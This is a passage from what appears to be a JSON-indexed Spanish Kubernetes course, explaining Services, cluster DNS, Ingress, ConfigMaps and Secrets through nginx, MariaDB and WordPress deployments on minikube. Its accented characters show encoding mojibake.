funcionamiento. Este tipo de Service no lo vamos a utilizar en el presente curso.\n\nComo vemos en el ejemplo, el cloud de infraestructura donde tengamos instalado el cluster nos ofrecer√° un recurso balanceador de carga con una IP accesible desde el exterior que nos permitir√° acceder a la aplicaci√≥n directamente."},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services":{"title":"6.1-describiendo-services","links":[],"tags":[],"content":"6.1 Describiendo services\nServices NodePort\nSuponemos que tenemos desplegado nginx usando el fichero yaml: nginx-deployment.yaml:\nkubectl apply -f nginx-deployment.yaml\n\nPor lo tanto tenemos dos Pods ofreciendo el servidor web nginx, a los que queremos acceder desde el exterior y que se balancee la carga entre ellos.\nAunque podr√≠amos crear un recurso Service desde la l√≠nea de comandos:\nkubectl expose deployment/nginx --port=80 --type=NodePort\n\nNormalmente lo que hacemos es describir las caracter√≠sticas del Service en un fichero yaml nginx-srv.yaml:\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\nspec:\n  type: NodePort\n  ports:\n  - name: service-http\n    port: 80\n    targetPort: http\n  selector:\n    app: nginx\n\nVeamos la descripci√≥n:\n\nVamos a crear un recurso Service (par√°metro kind) y lo nombramos como nginx (par√°metro name). Este nombre ser√° importante para la resoluci√≥n dns.\nEn la especificaci√≥n del recurso indicamos el tipo de Service (par√°metro type).\nA continuaci√≥n, definimos el puerto por el que va a ofrecer el Service y lo nombramos (dentro del apartado port: el par√°metro port y el par√°metro name). Adem√°s, debemos indicar el puerto en el que los Pods est√°n ofreciendo el Service (par√°metro targetPort), en este caso, hemos usado el nombre del puerto (http) que indicamos en el recurso Deployment:\n\n   ...\n   ports:\n    - name: http\n      containerPort: 80\n   ...\n\n\nPor ultimo, seleccionamos los Pods a los que vamos acceder y vamos a balancear la carga seleccionando los Pods por medio de sus etiquetas (par√°metro selector).\n"},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services":{"title":"6.2-gestionando-los-services","links":[],"tags":[],"content":"6.2 Gestionando los services\nService de tipo NodePort\nPara aprender c√≥mo gestionamos los Services, vamos a trabajar con el Deployment de nginx (nginx-deployment.yaml) y el Service NodePort (nginx-srv.yaml) para acceder a los Pods de este despliegue desde el exterior.\nCreamos el Deployment\nEl primer paso ser√≠a crear el Deployment de nginx:\nkubectl apply -f nginx-deployment.yaml\n\nCreamos el Service\nA continuaci√≥n vamos a crear el Service de tipo NodePort que nos permitir√° acceder al servidor nginx.\nkubectl apply -f nginx-srv.yaml\n\nPara ver los Services que tenemos creado:\nkubectl get services\n\nRecuerda que si usamos kubectl get all tambi√©n se mostrar√°n los Services.\nAntes de acceder a la aplicaci√≥n podemos ver la informaci√≥n m√°s detallada del Service que acabamos de crear:\nkubectl describe service/nginx\nName:                     nginx\n...\nSelector:                 app=nginx\nType:                     NodePort\n...\nIP:                       10.110.81.74\nPort:                     service-http  80/TCP\nTargetPort:               http/TCP\nNodePort:                 service-http  32717/TCP\nEndpoints:                172.17.0.3:80,172.17.0.4:80\n...\n\nPodemos ver la etiqueta de los Pods a los que accede (Selector). El tipo de Service (Type). La IP virtual que ha tomado (CLUSTER-IP) y que es accesible desde el cluster (IP). El puerto por el que ofrece el Service (Port). El puerto de los Pods a los que redirige el tr√°fico (TargetPort). Al ser un service de tipo NodePort nos da informaci√≥n del puerto que se asignado para acceder a la aplicaci√≥n (NodePort). Y por √∫ltimo, podemos ver las IPs de los Pods que ha seleccionado y sobre los que balancear√° la carga (Endpoints).\nAccediendo a la aplicaci√≥n\nVemos el Service que hemos creado:\nkubectl get services\n...\nnginx        NodePort    10.110.81.74   &lt;none&gt;        80:32717/TCP   32s\n\nObservamos que se ha asignado el puerto 32717 para el acceso, por lo tanto si desde un navegador accedemos a la IP del nodo master y a este puerto podremos ver la aplicaci√≥n.\n¬øC√≥mo s√© la direcci√≥n ip del nodo master del cluster minikube? Podemos ejecutar:\nminikube ip\n192.168.39.222\n\nY ya podemos acceder desde un navegador web:\n\nService ClusterIP\nEn esta ocasi√≥n vamos a desplegar una base de datos MariaDB. En este caso no vamos a necesitar acceder a la base de datos desde el exterior, pero necesitamos que los Pods de otro despliegue puedan acceder a ella. Por lo tanto vamos a crear un Service de tipo ClusterIP.\nPara el despliegue de MariaDB vamos a usar el fichero mariadb-deployment.yaml. Puedes comprobar que en la definici√≥n del contenedor hemos a√±adido la secci√≥n env que nos permite establecer variables de entorno para configurar el contenedor (los estudiaremos en el siguiente m√≥dulo).\nPara la creaci√≥n del Service utilizamos el fichero mariadb-srv.yaml.\nPara la creaci√≥n del Deployment y el Service vamos ejecutando las siguientes instrucciones:\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\n\nComprobamos el Service creado:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP       2m22s\n\nkubectl describe service/mariadb\nName:              mariadb\n...\nSelector:          app=mariadb\nType:              ClusterIP\n...\nIP:                10.106.60.233\nPort:              service-bd  3306/TCP\nTargetPort:        db-port/TCP\nEndpoints:         172.17.0.5:3306\n...\n\nPodemos comprobar que no se ha mapeado un puerto aleatorio para que accedamos usando la IP del nodo master. Los Pods que accedan a la IP 10.106.60.233 o al nombre mariadb y al puerto 3306 estar√°n accediendo al Pod (172.17.0.5:3306) del despliegue de mariadb.\nEliminando los servicios\nPor ejemplo para borrar el servicio mariadb, ejecutar√≠amos:\nkubectl delete service mariadb\n"},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes":{"title":"6.3-servicio-dns-en-kubernetes","links":[],"tags":[],"content":"6.3 Servicio DNS en Kubernetes\nExiste un componente de Kubernetes llamado CoreDNS, que ofrece un servidor DNS interno para que los Pods puedan resolver diferentes nombres de recursos (Services, Pods, ‚Ä¶) a direcciones IP.\nCada vez que se crea un nuevo recurso Service se crea un registro de tipo A con el nombre:\n&lt;nombre_servicio&gt;.&lt;nombre_namespace&gt;.svc.cluster.local.\n\nComprobemos el servidor DNS\nPartimos del punto anterior donde tenemos creados los dos Services:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP\nnginx        NodePort    10.110.81.74    &lt;none&gt;        80:32717/TCP\n\nPara comprobar el servidor DNS de nuestro cluster y que podemos resolver los nombres de los distintos Services, vamos a usar un Pod (busybox.yaml) creado desde una imagen busybox. Es una imagen muy peque√±a pero con algunas utilidades que nos vienen muy bien:\nkubectl apply -f busybox.yaml\n\n¬øQu√© servidor DNS est√° configurado en los Pods que estamos creando? Podemos ejecutar la siguiente instrucci√≥n para comprobarlo:\nkubectl exec -it busybox -- cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch default.svc.cluster.local svc.cluster.local cluster.local\n\n\nEl servidor DNS (componente coreDNS) tiene asignado la IP del cluster 10.96.0.10.\nPodemos utilizar el nombre corto del Service, porque buscar√° el nombre del host totalmente cualificado usando los dominios indicados en el par√°metro search. Como vemos el primer nombre de dominio es el que se crea con los Services: default.svc.cluster.local (recuerda que el namespace que estamos usando es default).\n\nVamos a comprobar que realmente se han creado dos registros A para cada uno de los Service, haciendo consultas DNS:\nkubectl exec -it busybox -- nslookup nginx\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tnginx.default.svc.cluster.local\nAddress: 10.110.81.74\n\nVemos que ha hecho la resoluci√≥n del nombre nginx con la IP correspondiente a su servicio. Y con el Service mariadb tambi√©n lo podemos hacer:\nkubectl exec -it busybox -- nslookup mariadb\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tmariadb.default.svc.cluster.local\nAddress: 10.106.60.233\n\nTambi√©n podemos comprobar que usando el nombre podemos acceder al servicio:\nkubectl exec -it busybox -- wget http://nginx\nConnecting to nginx (10.110.81.74:80)\nsaving to &#039;index.html&#039;\n...\n\nPodemos concluir que, cuando necesitemos acceder desde alguna aplicaci√≥n desplegada en nuestro cluster a otro servicio ofrecido por otro despliegue, utilizaremos el nombre que hemos asignado a su Service de acceso. Por ejemplo, si desplegamos un Wordpress y un servidor de base de datos mariadb, y creamos dos Services: uno de tipo NodePort para acceder desde el exterior al CMS, y otro, que llamamos mariadb de tipo ClusterIP para acceder ala base de datos, cuando tengamos que configurar el Wordpress para indicar la direcci√≥n de la base de datos, pondremos mariadb."},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller":{"title":"6.4-ingress-controller","links":[],"tags":[],"content":"6.4 Ingress Controller\nHasta ahora tenemos dos opciones principales para acceder a nuestras aplicaciones desde el exterior:\n\nUtilizando Services del tipo NodePort: Esta opci√≥n no es muy viable para entornos de producci√≥n ya que tenemos que utilizar puertos aleatorios desde 30000-40000.\nUtilizando Services del tipo LoadBalancer: Esta opci√≥n s√≥lo es v√°lida si trabajamos en un proveedor Cloud que nos ofrece un balanceador de carga para cada una de las aplicaciones, en cloud p√∫blico puede ser una opci√≥n muy cara.\n\nLa soluci√≥n puede ser utilizar un Ingress controller que nos permite utilizar un proxy inverso (HAproxy, nginx, traefik,‚Ä¶) que por medio de reglas de encaminamiento que obtiene de la API de Kubernetes, nos permite el acceso a nuestras aplicaciones por medio de nombres.\nInstalaci√≥n de Ingress Controller en minikube\nCuando hacemos una instalaci√≥n de minikube el componente de Ingress Controller no viene instalada por defecto. minikube nos ofrece un conjunto de addons que al activarlos nos instalan un determinado componente que nos ofrece una funcionalidad adicional. Para ver los addons que nos ofrece minikube podemos ejecutar:\nminikube addons list\n\nPara activar el Ingress Controller ejecutamos:\nminikube addons enable ingress\n\nPara comprobar si tenemos instalado el componente, podemos visualizar los Pods creados en el namespace ingress-nginx. Este espacio de nombre se ha creado para desplegar el controlador de ingress Por lo tanto al ejecutar:\nkubectl get pods -n ingress-nginx\n...\ningress-nginx-controller-558664778f-shjzp   1/1     Running     0\n...\n\nDebe aparece un Pod que se llama ingress-nginx-controller-..., si es as√≠, significa que se ha instalado un Ingress Controller basado en el proxy inverso nginx.\n\nDescribiendo el recurso Ingress\nUna vez instalado el componente Ingress Controller, ya podemos definir un recurso Ingress en un fichero yaml. Para ello vamos a trabajar con el despliegue y el Service que hemos creado de nginx.\nEl recurso Ingress para acceder a nuestro despliegue de nginx lo tenemos en el fichero ingress.yaml:\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: nginx\nspec:\n  rules:\n  - host: www.example.org\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: nginx\n            port:\n              number: 80\n\nHemos indicado el tipo de recurso Ingress (kind) y le hemos puesto un nombre (name). A continuaci√≥n en la especificaci√≥n del recurso vamos a poner una regla que relaciona un nombre de host con un Service que me permita el acceso a una aplicaci√≥n:\n\nhost: Indicamos el nombre de host que vamos a usar para el acceso. Este nombre debe apuntar a la ip del nodo master.\npath: Indicamos el path de la url que vamos a usar, en este caso ser√≠a la ruta ra√≠z: /. Esto nos sirve por si queremos servir la aplicaci√≥n en una ruta determinada, por ejemplo: www.example.org/app1.\npathType: No es importante, nos permite indicar c√≥mo se van a trabajar con las URL.\nbackend: Indicamos el Service al que vamos a acceder. En este caso indicamos el nombre del Service (service/name) y el puerto del Service (service/port/number).\n\nCuando se crea el recurso, y accedamos al nombre indicado, un proxy inverso redirigir√° las peticiones HTTP a la IP y al puerto del Service correspondiente. Nota: Utilizando Ingress no es necesario que los Services sean de tipo NodePort para acceder a la aplicaci√≥n desde el exterior.\nGestionando el recurso Ingress\nPara crear el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY podemos ver el recurso Ingress que hemos creado:\nkubectl get ingress\n\nY obtener informaci√≥n detallada del recurso con:\nkubectl describe ingress/nginx\n\n\nAccediendo a la aplicaci√≥n\nComo no tenemos un servidor DNS que nos permita gestionar los nombres que vamos a utilizar para el acceso a las aplicaciones, vamos a usar resoluci√≥n est√°tica. Para ello como root a√±adimos una nueva l√≠nea en el fichero /etc/hosts, indicando el nombre (www.example.org) y la ip a la que corresponde, la ip del nodo master:\n192.168.39.222  www.example.org\n\nY ya podemos acceder a la aplicaci√≥n usando el nombre:\n"},"Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas":{"title":"6.5-ejemplo-completo-aplicacion-de-temperaturas","links":[],"tags":[],"content":"6.5 Ejemplo completo: aplicaci√≥n de temperaturas\nVamos a hacer un despliegue completo de una aplicaci√≥n llamada Temperaturas. Esta aplicaci√≥n nos permite consultar la temperatura m√≠nima y m√°xima de todos los municipios de Espa√±a y estar√° formada por dos microservicios:\n\nfrontend: Es una aplicaci√≥n escrita en Python que nos ofrece una p√°gina web para hacer las b√∫squedas y visualizar los resultados. Este microservicio har√° peticiones HTTP al segundo microservicio para obtener la informaci√≥n.\nbackend: Es el segundo microservicio que nos ofrece un servicio web de tipo API Restful. A esta API Web podemos hacerles consultas sobre los municipios y sobre las temperaturas.\n\nAlgunas consideraciones sobre el despliegue que vamos a realizar:\n\nComo la aplicaci√≥n est√° formada por dos microservicios, tendremos que crear dos recursos Deployment para desplegar y controlar los Pods de cada despliegue por separado.\nNecesitaremos acceder desde el exterior al microservicio frontend por lo que crearemos un recurso Service de tipo NodePort.\nAl componente backend no es necesario acceder desde el exterior, por lo tanto crearemos un recurso Service de tipo ClusterIP para permitir que se acceda desde frontend.\nPara terminar usaremos un recurso Ingress para acceder al componente frontend por lo tanto, en ese momento, no es necesario que el Service para acceder a ese componente sea de tipo NodePort, bastar√≠a con que fuera ClusterIP.\n\n\nDespliegue y acceso al microservicio frontend\nEn primer lugar vamos a desplegar el primer microservicio. Esta aplicaci√≥n est√° usando el puerto 3000/tcp para ofrecer la aplicaci√≥n. Para describir el despliegue utilizaremos el fichero frontend-deployment.yaml y para crear el despliegue ejecutaremos la siguiente instrucci√≥n:\nkubectl apply -f frontend-deployment.yaml\n\nA continuaci√≥n usamos el fichero frontend-srv.yaml para crear el Service NodePort:\nkubectl apply -f frontend-srv.yaml\n\nObtenemos los recursos que hemos creado. Nos fijamos en el puerto que nos ha asignado por el Service NodePort (en mi caso el 30053). Vamos a acceder desde un navegador web usando la ip del nodo master y el puerto que nos han asignado:\n\nComo podemos observar la aplicaci√≥n nos muestra un mensaje de error: ‚ÄúNo puedo conectar con el servidor de temperaturas‚Ä¶. Evidentemente el componente frontend est√° intentando conectar con el componente backend y, evidentemente, no puede, ya que ni la hemos desplegado, ni hemos creado el Service correspondiente.\n\nDespliegue y acceso al microservicio backend\nEs el momento de desplegar el segundo microservicio. Este microservicio ofrece un servicio API Restful en el puerto 5000/tcp. Para ello utilizaremos el fichero backend-deployment.yaml para realizar el despliegue y el fichero backend-srv.yaml para crear el Service.\nkubectl apply -f backend-deployment.yaml\nkubectl apply -f backend-srv.yaml\n\nSi volvemos acceder al navegador y refrescamos la p√°gina, veremos que ya no nos sale el mensaje de error y podemos buscar la temperatura de nuestra ciudad:\n\nNota: Por defecto el componente frontend hace peticiones al componente backend utilizando el nombre temperaturas-backend, que es el nombre que hemos asignado al Service ClusterIP para el acceso al backend. En el pr√≥ximo m√≥dulo veremos como podemos cambiar la configuraci√≥n de frontend para cambiar el nombre del servicio web al que conecta.\n\nAlgunas consideraciones acerca del despliegue que hemos realizado\nEsta manera de trabajar donde cada microservicio que forma parte de la aplicaci√≥n (o si tenemos una aplicaci√≥n que necesite varios servicios (servidor web, servidor de base de datos,‚Ä¶)) se despliega de forma separada usando distintos recursos Deployment nos proporciona las siguientes caracter√≠sticas:\n\nCada conjunto de Pods creado en cada despliegue ejecutar√° un solo proceso para ofrecer un servicio o microservicio.\nCada conjunto de Pods se puede escalar de manera independiente. Esto es importante ya que si identificamos que al acceder a alguno de los servicios se crea un cuello de botella, podemos escalarlo para tener m√°s Pods ejecutando el servicio. En el ejemplo que hemos desarrollado, se crearon 3 Pods del frontend y un Pod del backend, pero se pueden escalar independientemente los dos despliegues. Te invito a escalar los dos despliegues y comprobar que sigue funcionando la aplicaci√≥n.\nLas actualizaciones de los distintos servicios / microservicios no interfieren en el resto.\nLo estudiaremos en un m√≥dulo posterior, pero podremos gestionar el almacenamiento de cada servicio de forma independiente.\nYa lo hemos comentado, pero con esta aplicaci√≥n podemos observar el balanceo de carga que realiza el Service al acceder al frontend: la aplicaci√≥n visualiza el nombre del servidor que est√° ofreciendo la p√°gina. Por lo tanto si vamos refrescando la p√°gina con F5 observaremos c√≥mo se va realizando el balanceo de carga y va cambiando el nombre del Pod al que est√° accediendo.\n\n\nAcceso a la aplicaci√≥n usando el Ingress Controller\nPara terminar vamos a crear un recurso Ingress que nos posibilite acceder a la aplicaci√≥n utilizando un nombre. Como hemos indicado al utilizar Ingress no es necesario que el Service al que accede sea de tipo NodePort, por lo tanto lo primero que vamos a hacer es cambiar el tipo de Service que accede a frontend y lo vamos a poner ClusterIP, para ello vamos a modificar el fichero frontend-srv.yaml cambiando el tipo de Service de NodePort a ClusterIP, y posteriormente aplicamos los cambios:\nkubectl apply -f frontend-srv.yaml\n\nComprobamos que realmente ha cambiado el tipo de Service, y que ya no tenemos un puerto para acceder usando la ip del nodo master.\nA continuaci√≥n usamos el fichero ingress.yaml para crear el recurso Ingress, que definir√° el nombre del host www.temperaturas.org que tendremos que introducir en la resoluci√≥n est√°tica tay como hemos visto anteriormente. Por lo tanto modificamos el fichero /etc/hosts de nuestro ordenador con la siguiente l√≠nea:\n192.168.39.222  www.temperaturas.org\n\nCreamos el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY accedemos a la aplicaci√≥n usando el nombre:\n\nEsquema\n"},"Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados":{"title":"7.0-despliegue-parametrizados","links":[],"tags":[],"content":"7. Despliegues parametrizados\nEn muchas ocasiones necesitamos parametrizar nuestros despliegues, para ello podemos guardar informaci√≥n de distinta forma. En este m√≥dulo vamos a estudiar distintas maneras de guardar informaci√≥n en kubernetes, que nos permitir√° posteriormente parametrizar los Deployments:\n\nVariables de entorno\nConfigMaps\nSecrets\n\nTerminaremos estudiaremos un ejemplo completo donde desplegaremos un WoordPress + MariaDB."},"Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno":{"title":"7.1-variables-de-entorno","links":[],"tags":[],"content":"7.1 Variables de entorno\nPara a√±adir alguna configuraci√≥n espec√≠fica a la hora de lanzar un contenedor, se usan variables de entorno del contenedor cuyos valores se especifican al crear el contenedor para realizar una configuraci√≥n concreta del mismo.\nPor ejemplo, si estudiamos la documentaci√≥n de la imagen mariadb en Docker Hub, podemos comprobar que podemos definir un conjunto de variables de entorno como MYSQL_ROOT_PASSWORD, MYSQL_DATABASE, MYSQL_USER, MYSQL_PASSWORD, etc., que nos permitir√°n configurar de alguna forma determinada nuestro servidor de base de datos (indicando la contrase√±a del usuario root, creando una determinada base de datos o creando un usuario con una contrase√±a por ejemplo.\nDe la misma manera, al especificar los contenedores que contendr√°n los Pods que se van a crear desde un Deployment, tambi√©n se pondr√°n inicializar las variables de entorno necesarias.\nConfiguraci√≥n de aplicaciones usando variables de entorno\nVamos a hacer un despliegue de un servidor de base de datos mariadb. Si volvemos a estudiar la documentaci√≥n de esta imagen en Docker Hub comprobamos que obligatoriamente tenemos que indicar la contrase√±a del usuario root inicializando la variable de entorno MYSQL_ROOT_PASSWORD. El fichero de despliegue que vamos a usar es mariadb-deployment-env.yaml, y vemos el fragmento del fichero donde se define el contenedor:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              value: my-password\n\nEn el apartado containers hemos incluido la secci√≥n env donde vamos indicando, como una lista, el nombre de la variable (name) y su valor (value). En este caso hemos indicado la contrase√±a my-password.\nVamos a comprobar si realmente se ha creado el servidor de base de datos con esa contrase√±a del root:\nkubectl apply -f mariadb-deploymen-env.yaml\n\nkubectl get all\n...\nNAME                                 READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/mariadb-deployment   1/1     1            1           5s\n\nkubectl exec -it deployment.apps/mariadb-deployment -- mysql -u root -p\nEnter password:\n...\nMariaDB [(none)]&gt;\n"},"Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps":{"title":"7.2-configmaps","links":[],"tags":[],"content":"7.2 ConfigMaps\nEn el apartado anterior hemos estudiado como podemos definir las variables de entorno de los contenedores que vamos a desplegar. Sin embargo, la soluci√≥n que presentamos puede tener alguna limitaci√≥n:\n\nLos valores de las variables de entorno est√°n escritos directamente en el fichero yaml. Estos ficheros yaml suelen estar en repositorios git y l√≥gicamente no es el sitio m√°s adecuado para ubicarlos.\nPor otro lado, escribiendo los valores de las variables de entorno directamente en los ficheros, hacemos que estos ficheros no sean reutilizables en otros despliegues y que el procedimiento de cambiar las variables sea tedioso y propenso a errores, porque hay que hacerlo en varios sitios.\n\nPara solucionar estas limitaciones, podemos usar un nuevo recurso de Kubernetes llamado ConfigMap.\nConfiguraci√≥n de aplicaciones usando ConfigMaps\nConfigMap permite definir un diccionario (clave,valor) para guardar informaci√≥n que se puede utilizar para configurar una aplicaci√≥n.\nAunque hay distintas formas de indicar el conjunto de claves-valor de nuestro ConfigMap, en este caso vamos a usar literales, por ejemplo:\nkubectl create cm mariadb --from-literal=root_password=my-password \\\n                          --from-literal=mysql_usuario=usuario     \\\n                          --from-literal=mysql_password=password-user \\\n                          --from-literal=basededatos=test\n\nEn el ejemplo anteriore, hemos creado un ConfigMap llamado mariadb con cuatro pares clave-valor. Para ver los ConfigMap que tenemos creados, podemos utilizar:\nkubectl get cm\n\nY para ver los detalles del mismo:\nkubectl describe cm mariadb\n\nUna vez que creado el ConfigMap se puede crear un despliegue donde las variables de entorno se inicializan con los valores guardados en el ConfigMap. Por ejemplo, un despliegue de una base de datos lo podemos encontrar en el fichero mariadb-deployment-configmap.yaml y el fragmento donde definimos las variables de entorno quedar√≠a:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: root_password\n            - name: MYSQL_USER\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_usuario\n            - name: MYSQL_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_password\n            - name: MYSQL_DATABASE\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: basededatos\n\nObservamos como al indicar las variables de entorno (secci√≥n env) seguimos indicado el nombre (name) pero el valor se indica con una clave de un ConfigMap (valueFrom: - configMapKeyRef:), para ello se indica el nombre del ConfigMap (name) y el valor que tiene una determinada clave (key). De esta manera, no guardamos en los ficheros yaml los valores espec√≠ficos de las variables de entorno, y adem√°s, estos valores se pueden reutilizar para otros despliegues, por ejemplo, al desplegar un CMS indicar los mismos valores para las credenciales de acceso a la base de datos."},"Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets":{"title":"7.3-secrets","links":[],"tags":[],"content":"7.3 Secrets\nCuando en un variable de entorno indicamos una informaci√≥n sensible, como por ejemplo, una contrase√±a o una clave ssh, es mejor utilizar un nuevo recurso de Kubernetes llamado Secret.\nLos Secrets permiten guardar informaci√≥n sensible que ser√° codificada o cifrada.\nHay distintos tipos de Secret, en este curso vamos a usar los gen√©ricos y los vamos a crear a partir de un literal. Por ejemplo para guardar la contrase√±a del usuario root de una base de datos, crear√≠amos un Secret de la siguiente manera:\nkubectl create secret generic mariadb --from-literal=password=my-password\n\nPodemos obtener informaci√≥n de los Secret que hemos creado con las instrucciones:\nkubectl get secret\nkubectl describe secret mariadb\n\nVeamos a continuaci√≥n c√≥mo quedar√≠a un despliegue que usa el valor de un Secret para inicializar una variable de entorno. Vamos a usar el fichero mariadb-deployment-secret.yaml y el fragmento donde definimos las variables de entorno quedar√≠a:\n...\n    spec:\n      containers:\n        - name: mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: mariadb\n                  key: password\n\nObservamos como al indicar las variables de entorno (secci√≥n env) seguimos indicado el nombre (name) pero el valor se indica con un valor de un Secret (valueFrom: - secretKeyRef:), indicando el nombre del Secret (name) y la clave correspondiente. (key)."},"Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb":{"title":"7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","links":[],"tags":[],"content":"7.4 Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB\nEn este ejemplo vamos a desplegar el CMS Wordpress y la base de datos MariaDB para su correcto funcionamiento. Cada uno de los servicios se van a desplegar independientemente, y configuraremos los Services para acceder desde el exterior a la aplicaci√≥n y para que el Wordpress pueda acceder a la base de datos:\nConfiguraci√≥n de los contenedores\n\nComo hemos estudiado en los ejemplos vistos en este m√≥dulo, al crear el despliegue de MariaDB tendremos que configurar las siguientes variables de entorno: MYSQL_ROOT_PASSWORD (contrase√±a del usuario root de la base de datos), MYSQL_DATABASE (el nombre de la base de datos que se va a crear), MYSQL_USER (nombre del usuario de la base de datos que se va carear), MYSQL_PASSWORD (contrase√±a de este usuario).\nSi comprobamos la documentaci√≥n de la imagen Wordpress en Docker Hub las variables de entorno que vamos a definir son las siguientes: WORDPRESS_DB_HOST (la direcci√≥n del servidor de base de datos), WORDPRESS_DB_USER (el usuario que se va a usar para acceder a la base de datos), WORDPRESS_DB_PASSWORD (la contrase√±a de dicho usuario) y WORDPRESS_DB_NAME (el nombre de la base de datos a las que vamos a conectar para gestionar las tablas de Wordpress).\n\nEvidentemente los valores de estas variables tienen que coincidir, es decir, el usuario y la contrase√±a que creemos en la base de datos ser√°n las mismas que utilicemos desde Wordpress para acceder a la base de datos, y el nombre de la base de datos usada por WordPres ser√° el mismo que la base de datos creada en MariaDB.\nLo veremos posteriormente, pero adelantamos, que el valor de la variable WORDPRESS_DB_HOST ser√° el nombre del Service que creemos para acceder a la base de datos, como ya hemos estudiado, se crear√° un registro en el DNS del cluster que permitir√° que Wordpress acceda a la base de datos usando el nombre del Service.\nLos valores para crear la base de datos y el usuario en MariaDB, que corresponden a las credenciales que vamos a usar en Wordpress, los vamos a guardar en dos recursos de nuestro cluster: los datos no sensibles (nombre de usuario y nombre de la base de datos) lo guardaremos en un ConfigMap y los datos sensibles, las contrase√±as, la guardaremos en un Secret.\nPara ello ejecutamos las siguientes instrucciones:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234\n\nNota: No hemos guardado la definici√≥n del ConfigMap y el Secret en un fichero yaml. De esta manera evitamos que informaci√≥n sensible sea guardada por ejemplo en un repositorio git.\nSin embargo, a partir de las instrucciones anteriores podemos generar ficheros yaml que posteriormente a√±adimos a la configuraci√≥n del cluster. Podemos ejecutar:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress \\\n                           -o yaml --dry-run=client &gt; bd_datos_configmap.yaml\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234 \\\n                                           -o yaml --dry-run=client &gt; bd_passwords_secret.yaml\n\nCon la opci√≥n --dry-run=client, kubectl va a simular la creaci√≥n del recurso, pero no se llega a ejecutar, sin embargo con la opci√≥n -o yaml generamos el fichero yaml con la definici√≥n del recurso. Posteriormente s√≥lamente tendremos que ejecutar las siguientes instrucciones para crear los dos recursos:\nkubectl apply -f bd_datos_configmap.yaml\nkubectl apply -f bd_passwords_secret.yaml\n\nDespliegue de la base de datos\nPara desplegar la base de datos vamos a usar el fichero mariadb-deployment.yaml. Podemos observar en el fichero c√≥mo los datos de las variables de entorno del contenedor se inicalizan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Ejecutamos:\nkubectl apply -f mariadb-deployment.yaml\n\nLa definici√≥n del Service que vamos a crear lo tenemos en el fichero: mariadb-srv.yaml. Como comprobamos en la definici√≥n estamos creando un Service del tipo ClusterIP, ya que no vamos a acceder a la base de datos desde el exterior. Adem√°s es importante recordar el nombre que hemos puesto al Service (mariadb-service), ya que c√≥mo hemos indicado posteriormente, usaremos este nombre para configurar la aplicaci√≥n Wordpress a la hora de indicar el servidor de base de datos. Ejecutamos:\nkubectl apply -f mariadb-srv.yaml\n\nDespliegue de la aplicaci√≥n Wordpress\nPara desplegar la aplicaci√≥n Wordpress vamos a usar el fichero wordpress-deployment.yaml. Podemos observar en el fichero c√≥mo los datos de las variables de entorno del contenedor se inicializan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Adem√°s, comprobamos que la variable de entorno WORDPRESS_DB_HOST se inicializa a mariadb-service, que es el nombre del Service creado para a acceder a mariaDB. Ejecutamos:\nkubectl apply -f wordpress-deployment.yaml\n\nLa definici√≥n del Service que vamos a crear la tenemos en el fichero: wordpress-srv.yaml. Como comprobamos en la definici√≥n estamos creando un Service del tipo NodePort, pero tambi√©n podr√≠amos haberlo configurado de tipo ClusterIP, porque posteriormente vamos a crear un recurso Ingress para acceder a la aplicaci√≥n. Ejecutamos:\nkubectl apply -f wordpress-srv.yaml\n\nAcceso a 